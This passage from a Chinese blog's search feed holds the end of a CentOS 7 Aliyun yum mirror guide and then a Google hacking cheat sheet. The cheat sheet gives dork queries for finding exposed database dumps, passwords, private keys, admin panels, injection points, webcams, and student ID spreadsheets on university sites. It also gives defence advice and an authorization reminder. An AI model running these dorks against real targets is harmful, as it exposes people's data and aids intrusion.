class="hljs-regexp">/updates/</span><span class="hljs-variable">$basearch</span>/<br>gpgcheck=<span class="hljs-number">1</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br> <br><span class="hljs-comment">#additional packages that may be useful</span><br>[extras]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Extras - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/extras/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/extras/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.cloud.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/extras/</span><span class="hljs-variable">$basearch</span>/<br>gpgcheck=<span class="hljs-number">1</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br> <br><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><br>[centosplus]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Plus - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/centosplus/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/centosplus/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.cloud.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/centosplus/</span><span class="hljs-variable">$basearch</span>/<br>gpgcheck=<span class="hljs-number">1</span><br>enabled=<span class="hljs-number">0</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br> <br><span class="hljs-comment">#contrib - packages by Centos Users</span><br>[contrib]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Contrib - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/contrib/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/contrib/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.cloud.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/contrib/</span><span class="hljs-variable">$basearch</span>/<br>gpgcheck=<span class="hljs-number">1</span><br>enabled=<span class="hljs-number">0</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br>[epel]<br>name=Extra Packages <span class="hljs-keyword">for</span> Enterprise Linux <span class="hljs-number">7</span> - <span class="hljs-variable">$basearch</span><br>baseurl=http:<span class="hljs-regexp">//</span>download.fedoraproject.org<span class="hljs-regexp">/pub/</span>epel<span class="hljs-regexp">/7/</span><span class="hljs-variable">$basearch</span><br><span class="hljs-comment">#mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-7&amp;arch=$basearch</span><br>failovermethod=priority<br>enabled=<span class="hljs-number">1</span><br>gpgcheck=<span class="hljs-number">1</span><br>gpgkey=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>pki<span class="hljs-regexp">/rpm-gpg/</span>RPM-GPG-KEY-EPEL-<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h1 id="生成yum缓存-更新"><a href="#生成yum缓存-更新" class="headerlink" title="生成yum缓存 &amp; 更新"></a>生成yum缓存 &amp; 更新</h1><p><code>yum makecache &amp;&amp; yum -y update</code></p><h1 id="等待更新完成即可"><a href="#等待更新完成即可" class="headerlink" title="等待更新完成即可"></a>等待更新完成即可</h1>]]></content>
    
    
    
    <tags>
      
      <tag>centos7</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>googlehacking</title>
    <link href="/2025/06/24/googlehacking/"/>
    <url>/2025/06/24/googlehacking/</url>
    
    <content type="html"><![CDATA[<h1 id="首选："><a href="#首选：" class="headerlink" title="首选："></a>首选：</h1><p>site:xxx.edu.cn 初始密码&#x2F;密码&#x2F;登录&#x2F;用户手册&#x2F;操作说明……</p><p>site:hueb.edu.cn filetype:xls 学号&#x2F;sfz……</p><h3 id="一、完整-Google-Hacking-语法列表"><a href="#一、完整-Google-Hacking-语法列表" class="headerlink" title="一、完整 Google Hacking 语法列表"></a><strong>一、完整 Google Hacking 语法列表</strong></h3><h4 id="1-基础操作符"><a href="#1-基础操作符" class="headerlink" title="1. 基础操作符"></a><strong>1. 基础操作符</strong></h4><table><thead><tr><th align="left"><strong>操作符</strong></th><th align="left"><strong>说明</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left">site:</td><td align="left">限定搜索特定域名或子域名</td><td align="left">site:example.com</td></tr><tr><td align="left">intitle:</td><td align="left">标题包含关键词</td><td align="left">intitle:”login”</td></tr><tr><td align="left">allintitle:</td><td align="left">标题包含所有指定关键词</td><td align="left">allintitle:”admin” “dashboard”</td></tr><tr><td align="left">inurl:</td><td align="left">URL 路径包含关键词</td><td align="left">inurl:&#x2F;admin</td></tr><tr><td align="left">allinurl:</td><td align="left">URL 路径包含所有指定关键词</td><td align="left">allinurl:login.php?user&#x3D;</td></tr><tr><td align="left">filetype:</td><td align="left">搜索特定文件类型</td><td align="left">filetype:pdf “confidential”</td></tr><tr><td align="left">ext:</td><td align="left">按文件扩展名搜索（同 filetype:）</td><td align="left">ext:sql “password”</td></tr><tr><td align="left">intext:</td><td align="left">正文内容包含关键词</td><td align="left">intext:”数据库密码”</td></tr><tr><td align="left">allintext:</td><td align="left">正文包含所有指定关键词</td><td align="left">allintext:”username” “password”</td></tr><tr><td align="left">cache:</td><td align="left">查看 Google 缓存的页面</td><td align="left">cache:example.com</td></tr><tr><td align="left">related:</td><td align="left">查找类似网站</td><td align="left">related:github.com</td></tr><tr><td align="left">info:</td><td align="left">获取网站的 Google 摘要信息</td><td align="left">info:example.com</td></tr><tr><td align="left">define:</td><td align="left">搜索词语定义</td><td align="left">define:SQL注入</td></tr></tbody></table><h4 id="2-逻辑操作符"><a href="#2-逻辑操作符" class="headerlink" title="2. 逻辑操作符"></a><strong>2. 逻辑操作符</strong></h4><table><thead><tr><th align="left"><strong>操作符</strong></th><th align="left"><strong>说明</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left">AND 或空格</td><td align="left">同时满足多个条件</td><td align="left">site:example.com 密码</td></tr><tr><td align="left">OR</td><td align="left">满足任意一个条件</td><td align="left">漏洞 OR 后门</td></tr><tr><td align="left">-</td><td align="left">排除关键词</td><td align="left">登录 -site:example.com</td></tr><tr><td align="left">()</td><td align="left">组合复杂逻辑</td><td align="left">(inurl:admin OR intitle:admin) -论坛</td></tr></tbody></table><h4 id="3-高级操作符"><a href="#3-高级操作符" class="headerlink" title="3. 高级操作符"></a><strong>3. 高级操作符</strong></h4><table><thead><tr><th align="left"><strong>操作符</strong></th><th align="left"><strong>说明</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left">*</td><td align="left">通配符（匹配任意字符）</td><td align="left">“username:* password:*“</td></tr><tr><td align="left">“…”</td><td align="left">精确匹配短语</td><td align="left">“您的密码错误”</td></tr><tr><td align="left">..</td><td align="left">数值范围搜索</td><td align="left">价格 $100..$500</td></tr><tr><td align="left">AROUND(N)</td><td align="left">关键词间距不超过 N 个词</td><td align="left">“密码” AROUND(5) “泄露”</td></tr><tr><td align="left">weather:</td><td align="left">搜索某地天气</td><td align="left">weather:北京</td></tr><tr><td align="left">stocks:</td><td align="left">搜索股票代码</td><td align="left">stocks:GOOG</td></tr></tbody></table><h4 id="4-隐藏功能"><a href="#4-隐藏功能" class="headerlink" title="4. 隐藏功能"></a><strong>4. 隐藏功能</strong></h4><table><thead><tr><th align="left"><strong>功能</strong></th><th align="left"><strong>说明</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left"><strong>时间筛选</strong></td><td align="left">限定时间范围（通过搜索工具栏）</td><td align="left">最近一年、自定义日期</td></tr><tr><td align="left"><strong>图片搜索</strong></td><td align="left">通过图片反向搜索敏感信息</td><td align="left">上传图片查找来源</td></tr><tr><td align="left"><strong>地图数据</strong></td><td align="left">搜索暴露的地理标记信息</td><td align="left">intitle:”security camera” site:google.com&#x2F;maps</td></tr></tbody></table><hr><h3 id="二、组合示例大全（按场景分类）"><a href="#二、组合示例大全（按场景分类）" class="headerlink" title="二、组合示例大全（按场景分类）"></a><strong>二、组合示例大全（按场景分类）</strong></h3><h4 id="1-敏感文件泄露"><a href="#1-敏感文件泄露" class="headerlink" title="1. 敏感文件泄露"></a><strong>1. 敏感文件泄露</strong></h4><table><thead><tr><th align="left"><strong>场景</strong></th><th align="left"><strong>示例</strong></th><th align="left"><strong>说明</strong></th></tr></thead><tbody><tr><td align="left"><strong>数据库备份</strong></td><td align="left">filetype:sql “DROP TABLE” site:example.com</td><td align="left">搜索 SQL 备份文件</td></tr><tr><td align="left"><strong>配置文件</strong></td><td align="left">intitle:”index of” “config.php”</td><td align="left">查找 PHP 配置文件</td></tr><tr><td align="left"><strong>日志文件</strong></td><td align="left">ext:log “error” “password”</td><td align="left">包含密码的日志文件</td></tr><tr><td align="left"><strong>密钥文件</strong></td><td align="left">filetype:key private</td><td align="left">私钥文件泄露</td></tr></tbody></table><h4 id="2-后台与登录页面"><a href="#2-后台与登录页面" class="headerlink" title="2. 后台与登录页面"></a><strong>2. 后台与登录页面</strong></h4><table><thead><tr><th align="left"><strong>场景</strong></th><th align="left"><strong>示例</strong></th><th align="left"><strong>说明</strong></th></tr></thead><tbody><tr><td align="left"><strong>管理员后台</strong></td><td align="left">intitle:”admin login” inurl:&#x2F;admin</td><td align="left">未授权访问的管理页面</td></tr><tr><td align="left"><strong>默认密码</strong></td><td align="left">“默认密码” site:routerlogin.net</td><td align="left">设备默认凭据</td></tr><tr><td align="left"><strong>弱口令提示</strong></td><td align="left">intext:”用户名或密码错误” inurl:login</td><td align="left">登录页面错误信息</td></tr></tbody></table><h4 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a><strong>3. 漏洞利用</strong></h4><table><thead><tr><th align="left"><strong>场景</strong></th><th align="left"><strong>示例</strong></th><th align="left"><strong>说明</strong></th></tr></thead><tbody><tr><td align="left"><strong>SQL 注入点</strong></td><td align="left">inurl:”id&#x3D;” &amp; intext:”Warning: mysql”</td><td align="left">存在报错信息的注入点</td></tr><tr><td align="left"><strong>目录遍历</strong></td><td align="left">intitle:”index of &#x2F;“ “parent directory”</td><td align="left">开放目录列表</td></tr><tr><td align="left"><strong>API 接口暴露</strong></td><td align="left">inurl:&#x2F;api&#x2F;v1 intext:”apikey”</td><td align="left">泄露的 API 密钥</td></tr></tbody></table><h4 id="4-设备与系统"><a href="#4-设备与系统" class="headerlink" title="4. 设备与系统"></a><strong>4. 设备与系统</strong></h4><table><thead><tr><th align="left"><strong>场景</strong></th><th align="left"><strong>示例</strong></th><th align="left"><strong>说明</strong></th></tr></thead><tbody><tr><td align="left"><strong>网络摄像头</strong></td><td align="left">inurl:&#x2F;view.shtml intitle:”Live View”</td><td align="left">公开的摄像头流</td></tr><tr><td align="left"><strong>路由器管理</strong></td><td align="left">intitle:”RouterOS” “admin”</td><td align="left">未授权的路由器配置页面</td></tr><tr><td align="left"><strong>打印机控制台</strong></td><td align="left">inurl:”&#x2F;hp&#x2F;device&#x2F;this.LCDispatcher”</td><td align="left">惠普打印机管理界面</td></tr></tbody></table><h4 id="5-开源情报（OSINT）"><a href="#5-开源情报（OSINT）" class="headerlink" title="5. 开源情报（OSINT）"></a><strong>5. 开源情报（OSINT）</strong></h4><table><thead><tr><th align="left"><strong>场景</strong></th><th align="left"><strong>示例</strong></th><th align="left"><strong>说明</strong></th></tr></thead><tbody><tr><td align="left"><strong>员工信息</strong></td><td align="left">site:linkedin.com “CTO” “example.com”</td><td align="left">通过 LinkedIn 收集员工职位</td></tr><tr><td align="left"><strong>文档元数据</strong></td><td align="left">filetype:docx “作者：张三”</td><td align="left">从 Office 文档提取创建者信息</td></tr><tr><td align="left"><strong>GitHub 泄露</strong></td><td align="left">“github.com” “password” extension:env</td><td align="left">GitHub 中的敏感环境变量文件</td></tr></tbody></table><h4 id="6-错误信息泄露"><a href="#6-错误信息泄露" class="headerlink" title="6. 错误信息泄露"></a><strong>6. 错误信息泄露</strong></h4><table><thead><tr><th align="left"><strong>场景</strong></th><th align="left"><strong>示例</strong></th><th align="left"><strong>说明</strong></th></tr></thead><tbody><tr><td align="left"><strong>调试模式</strong></td><td align="left">intext:”DEBUG MODE” “PHP”</td><td align="left">开启调试模式的网站</td></tr><tr><td align="left"><strong>数据库报错</strong></td><td align="left">“ORA-12541: TNS 无监听程序”</td><td align="left">Oracle 数据库错误信息</td></tr><tr><td align="left"><strong>堆栈跟踪</strong></td><td align="left">intext:”at java.lang.Thread”</td><td align="left">Java 应用崩溃日志</td></tr></tbody></table><hr><h3 id="三、高阶组合技巧"><a href="#三、高阶组合技巧" class="headerlink" title="三、高阶组合技巧"></a><strong>三、高阶组合技巧</strong></h3><h4 id="1-通配符与模糊搜索"><a href="#1-通配符与模糊搜索" class="headerlink" title="1. 通配符与模糊搜索"></a><strong>1. 通配符与模糊搜索</strong></h4><ul><li>搜索带参数的 URL：<br>inurl:*.php?id&#x3D; *</li><li>查找密码重置链接：<br>“password reset” site:example.com inurl:token&#x3D;*</li></ul><h4 id="2-时间范围限定"><a href="#2-时间范围限定" class="headerlink" title="2. 时间范围限定"></a><strong>2. 时间范围限定</strong></h4><ul><li>查找近期泄露的数据库：<br>filetype:sql “INSERT INTO users” after:2023-01-01</li></ul><h4 id="3-混合逻辑精准定位"><a href="#3-混合逻辑精准定位" class="headerlink" title="3. 混合逻辑精准定位"></a><strong>3. 混合逻辑精准定位</strong></h4><ul><li>排除干扰结果：<br>(intitle:”管理后台” OR inurl:&#x2F;admin) -site:gov.cn</li><li>组合文件类型与关键词：<br>filetype:xls “员工工资” site:example.com</li></ul><h4 id="4-利用错误消息"><a href="#4-利用错误消息" class="headerlink" title="4. 利用错误消息"></a><strong>4. 利用错误消息</strong></h4><ul><li>发现 SQL 注入漏洞：<br>“You have an error in your SQL syntax”</li><li>识别配置错误：<br>“Access denied for user ‘root‘@’localhost’”</li></ul><hr><h3 id="四、防御建议（补充）"><a href="#四、防御建议（补充）" class="headerlink" title="四、防御建议（补充）"></a><strong>四、防御建议（补充）</strong></h3><ol><li><strong>robots.txt 配置</strong>：禁止爬虫访问敏感路径（如 &#x2F;admin、&#x2F;config）。</li><li><strong>文件权限控制</strong>：避免将备份文件（.bak、.sql）存放在 Web 目录。</li><li><strong>错误信息隐藏</strong>：自定义错误页面，避免暴露堆栈跟踪。</li><li><strong>定期搜索自身</strong>：用 site:yourdomain.com 检查公开信息泄露。</li></ol><hr><h3 id="五、工具增强"><a href="#五、工具增强" class="headerlink" title="五、工具增强"></a><strong>五、工具增强</strong></h3><ul><li><strong>Google Dork 自动化</strong>：<ul><li><a href="https://www.exploit-db.com/google-hacking-database">GHDB</a>：直接搜索预定义的漏洞语法。</li><li><a href="https://github.com/...">DorkGenius</a>：自动生成高级 Dork 语句。</li></ul></li><li><strong>监控与告警</strong>：<ul><li>使用 Google Alerts 监控公司关键词（如 site:example.com password）。</li></ul></li></ul><hr><h3 id="六、合法与道德提醒"><a href="#六、合法与道德提醒" class="headerlink" title="六、合法与道德提醒"></a><strong>六、合法与道德提醒</strong></h3><ul><li><strong>仅用于授权测试</strong>：渗透前需获得书面许可。</li><li><strong>漏洞报告</strong>：发现漏洞后联系管理员，参考《<a href="https://www.rfc-editor.org/rfc/rfc9116">漏洞披露规范</a>》。</li><li><strong>避免敏感数据</strong>：示例中的关键词均为演示用途，请勿针对真实系统测试。</li></ul><h3 id="七、语法解析与示例"><a href="#七、语法解析与示例" class="headerlink" title="七、语法解析与示例"></a><strong>七、语法解析与示例</strong></h3><h4 id="1-index-of-admin"><a href="#1-index-of-admin" class="headerlink" title="1. index of &#x2F;admin"></a><strong>1. index of &#x2F;admin</strong></h4><ul><li><strong>用途</strong>：搜索开放目录列表中的 &#x2F;admin 目录（常见管理后台路径）。</li><li><strong>风险</strong>：暴露后台登录页面、未授权访问管理界面。</li><li><strong>防御</strong>：禁用目录列表（Apache: Options -Indexes），设置访问权限（如 IP 白名单）。</li></ul><h4 id="2-index-of-passwd"><a href="#2-index-of-passwd" class="headerlink" title="2. index of &#x2F;passwd"></a><strong>2. index of &#x2F;passwd</strong></h4><ul><li><strong>用途</strong>：查找 Unix&#x2F;Linux 系统中的 &#x2F;etc&#x2F;passwd 文件（用户账户信息）。</li><li><strong>风险</strong>：泄露用户名、UID&#x2F;GID 等敏感信息（现代系统密码存储在 &#x2F;etc&#x2F;shadow）。</li><li><strong>防御</strong>：确保 &#x2F;etc&#x2F;passwd 文件权限为 644，禁止 Web 访问系统文件。</li></ul><h4 id="3-index-of-password"><a href="#3-index-of-password" class="headerlink" title="3. index of &#x2F;password"></a><strong>3. index of &#x2F;password</strong></h4><ul><li><strong>用途</strong>：搜索包含 “password” 关键词的目录或文件（如明文密码文件）。</li><li><strong>风险</strong>：直接获取明文密码或哈希值。</li><li><strong>防御</strong>：避免在代码或文件中明文存储密码，使用环境变量或密钥管理服务。</li></ul><h4 id="4-index-of-mail"><a href="#4-index-of-mail" class="headerlink" title="4. index of &#x2F;mail"></a><strong>4. index of &#x2F;mail</strong></h4><ul><li><strong>用途</strong>：查找邮件服务器或邮件存储目录（如 &#x2F;var&#x2F;mail）。</li><li><strong>风险</strong>：泄露用户邮件内容、账户信息。</li><li><strong>防御</strong>：限制邮件目录的 Web 访问权限，加密存储敏感数据。</li></ul><h4 id="5-“index-of-“-passwd"><a href="#5-“index-of-“-passwd" class="headerlink" title="5. “index of &#x2F;“ +passwd"></a><strong>5. “index of &#x2F;“ +passwd</strong></h4><ul><li><strong>用途</strong>：在根目录下搜索 passwd 文件。</li><li><strong>示例结果</strong>：可能发现 &#x2F;etc&#x2F;passwd 被错误链接到 Web 根目录。</li><li><strong>防御</strong>：检查 Web 目录中是否存在符号链接到系统文件。</li></ul><h4 id="6-“index-of-“-password-txt"><a href="#6-“index-of-“-password-txt" class="headerlink" title="6. “index of &#x2F;“ +password.txt"></a><strong>6. “index of &#x2F;“ +password.txt</strong></h4><ul><li><strong>用途</strong>：查找 Web 根目录下的 password.txt 文件。</li><li><strong>风险</strong>：明文密码文件可直接下载。</li><li><strong>防御</strong>：删除测试或临时文件，禁用目录列表。</li></ul><h4 id="7-“index-of-“-htaccess"><a href="#7-“index-of-“-htaccess" class="headerlink" title="7. “index of &#x2F;“ +.htaccess"></a><strong>7. “index of &#x2F;“ +.htaccess</strong></h4><ul><li><strong>用途</strong>：暴露 Apache 服务器的 .htaccess 配置文件。</li><li><strong>风险</strong>：泄露重定向规则、认证凭据（如 AuthUserFile 路径）。</li><li><strong>防御</strong>：限制 .htaccess 文件权限（如 600），避免存储敏感信息。</li></ul><h4 id="8-“index-of-root”"><a href="#8-“index-of-root”" class="headerlink" title="8. “index of &#x2F;root”"></a><strong>8. “index of &#x2F;root”</strong></h4><ul><li><strong>用途</strong>：搜索 Unix 系统超级用户（root）的主目录。</li><li><strong>风险</strong>：泄露 root 用户的 SSH 密钥、脚本或日志。</li><li><strong>防御</strong>：确保 &#x2F;root 目录权限为 700，禁止 Web 服务器访问。</li></ul><h4 id="9-“index-of-cgi-bin”"><a href="#9-“index-of-cgi-bin”" class="headerlink" title="9. “index of &#x2F;cgi-bin”"></a><strong>9. “index of &#x2F;cgi-bin”</strong></h4><ul><li><strong>用途</strong>：查找 CGI 脚本目录（常见于老旧系统）。</li><li><strong>风险</strong>：利用 CGI 漏洞（如 Shellshock）执行远程代码。</li><li><strong>防御</strong>：升级或禁用 CGI 模块，设置严格的脚本权限。</li></ul><h4 id="10-“index-of-logs”"><a href="#10-“index-of-logs”" class="headerlink" title="10. “index of &#x2F;logs”"></a><strong>10. “index of &#x2F;logs”</strong></h4><ul><li><strong>用途</strong>：暴露日志文件目录（如访问日志、错误日志）。</li><li><strong>风险</strong>：日志中可能包含敏感信息（如 SQL 错误中的数据库密码）。</li><li><strong>防御</strong>：将日志存储在非 Web 目录，定期清理并加密存档。</li></ul><h4 id="11-“index-of-config”"><a href="#11-“index-of-config”" class="headerlink" title="11. “index of &#x2F;config”"></a><strong>11. “index of &#x2F;config”</strong></h4><ul><li><strong>用途</strong>：查找配置文件目录（如数据库连接信息）。</li><li><strong>风险</strong>：泄露 config.php、settings.ini 等文件。</li><li><strong>防御</strong>：将配置文件移出 Web 目录，使用环境变量注入配置。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>googlehacking</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>begin</title>
    <link href="/2025/06/23/begin/"/>
    <url>/2025/06/23/begin/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
